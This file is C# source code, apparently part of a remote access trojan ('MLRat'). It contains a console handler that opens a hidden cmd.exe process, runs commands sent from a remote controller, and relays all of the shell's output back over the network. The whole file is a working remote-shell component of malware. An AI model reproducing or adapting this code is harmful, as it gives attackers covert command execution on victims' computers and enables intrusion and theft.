using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace MLManagementClient.Handlers
{
    public static class ConsoleHandler
    {
        private static Process console = null;
        private static Thread consoleThread = null; 
        private static IClientHost NetworkHost = null;
        public static void SetNetworkHost(IClientHost host)
        {
            NetworkHost = host;
        }

        public static void Handle(object[] data)
        {
            ConsoleCommand command = (ConsoleCommand)data[1];
            if (command == ConsoleCommand.SendCommand) EnterCommand((string)data[2]);
        }

        static void EnterCommand(string command)
        {
            SetupConsole();
            console.StandardInput.WriteLine(command);
        }

        static void SetupConsole()
        {
            if(console == null || console.HasExited)
            {
                if (consoleThread != null && consoleThread.ThreadState == System.Threading.ThreadState.Running)
                    consoleThread.Abort();
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                psi.UseShellExecute = false;
                psi.RedirectStandardInput = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                console = Process.Start(psi);

                consoleThread = new Thread(() =>
                {
                    try
                    {
                        using (StreamReader sr = console.StandardOutput)
                        {
                            string line = string.Empty;
                            while ((line = sr.ReadLine()) != null)
                            {
                                if(!string.IsNullOrEmpty(line))
                                    NetworkHost.Send((byte)NetworkCommand.Console, (byte)ConsoleCommand.Responce, line);
                            }
                        }
                        console.Kill();
                    }
                    catch
                    {

                    }
                });
                consoleThread.Start();
                NetworkHost.Send((byte)NetworkCommand.Console, (byte)ConsoleCommand.Responce, ">> New session started");
            }
        }
    }
}
